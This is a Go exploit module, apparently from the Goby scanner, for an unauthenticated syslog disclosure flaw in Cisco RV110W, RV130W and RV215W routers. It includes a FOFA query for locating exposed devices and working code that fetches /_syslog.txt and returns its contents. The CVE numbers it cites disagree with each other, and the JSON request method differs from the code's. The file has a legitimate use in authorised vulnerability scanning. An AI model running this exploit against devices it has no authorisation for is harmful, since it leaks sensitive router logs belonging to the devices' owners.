package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Cisco RV110W RV130W RV215W router Information leakage",
    "Description": "<p>Cisco RV110W, etc. are all a VPN firewall router of Cisco. An authorization issue vulnerability exists in Cisco RV110W, RV130W, and RV215W. </p><p>A remote attacker can read the syslog file of the device,The syslog log may contain important and sensitive information, thereby threatening the security of the entire system.</p>",
    "Impact": "Cisco RV110W RV130W RV215W router Information leakage",
    "Recommendation": "<p>The vendor has fixed the vulnerability, and the link to obtain the patch:<a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190619-rv-fileaccess\">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190619-rv-fileaccess</a></p>",
    "Product": "Cisco-RV130W",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "Cisco RV110W RV130W RV215W 路由器 syslog.txt 文件敏感信息泄露漏洞",
            "Description": "<p>Cisco RV110W 等都是美国思科（Cisco）公司的一款 VPN 防火墙路由器。</p><p> Cisco RV110W、RV130W和RV215W中存在授权问题漏洞。远程攻击者可以通过该漏洞读取设备的 syslog 文件，其中 syslog 日志可能包含重要敏感信息，从而威胁整个系统安全。</p>",
            "Impact": "<p>远程攻击者可以通过该漏洞读取设备的 syslog 文件，其中 syslog 日志可能包含重要敏感信息，从而威胁整个系统安全。<br></p>",
            "Recommendation": "<p>厂商已修复该漏洞，补丁获取链接：<a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190619-rv-fileaccess\" target=\"_blank\">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190619-rv-fileaccess</a>&nbsp;。<br></p>",
            "Product": "Cisco-RV130W",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Cisco RV110W RV130W RV215W router Information leakage",
            "Description": "<p>Cisco RV110W, etc. are all a VPN firewall router of Cisco. An authorization issue vulnerability exists in Cisco RV110W, RV130W, and RV215W. </p><p>A remote attacker can read the syslog file of the device,The syslog log may contain important and sensitive information, thereby threatening the security of the entire system.</p>",
            "Impact": "Cisco RV110W RV130W RV215W router Information leakage",
            "Recommendation": "<p>The vendor has fixed the vulnerability, and the link to obtain the patch:<a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190619-rv-fileaccess\">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190619-rv-fileaccess</a></p>",
            "Product": "Cisco-RV130W",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "body=\"image/login_progress.gif\" && title=\"Login Page\" && cert=\"Cisco Small Business\"",
    "GobyQuery": "body=\"image/login_progress.gif\" && title=\"Login Page\" && cert=\"Cisco Small Business\"",
    "Author": "keeeee",
    "Homepage": "https://www.cisco.com/",
    "DisclosureDate": "2021-10-13",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2019-1898"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "0",
    "CVSS": "5.3",
    "CVEIDs": [
        "CVE-2019-1899"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/_syslog.txt",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "new AAA",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Ethernet LAN",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/_syslog.txt",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "new AAA",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Ethernet LAN",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "Tips",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10230"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewGetRequestConfig("/_syslog.txt")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.HeaderString.String(), `Content-Disposition: attachment;`)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewGetRequestConfig("/_syslog.txt")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.HeaderString.String(), `Content-Disposition: attachment;`) {
					expResult.Success = true
					if resp.Utf8Html == "" {
						expResult.Output = "the exp runs successfully ,but the _syslog.txt file is empty"
					} else {
						expResult.Output = resp.Utf8Html
					}
				}
			}
			return expResult
		},
	))
}
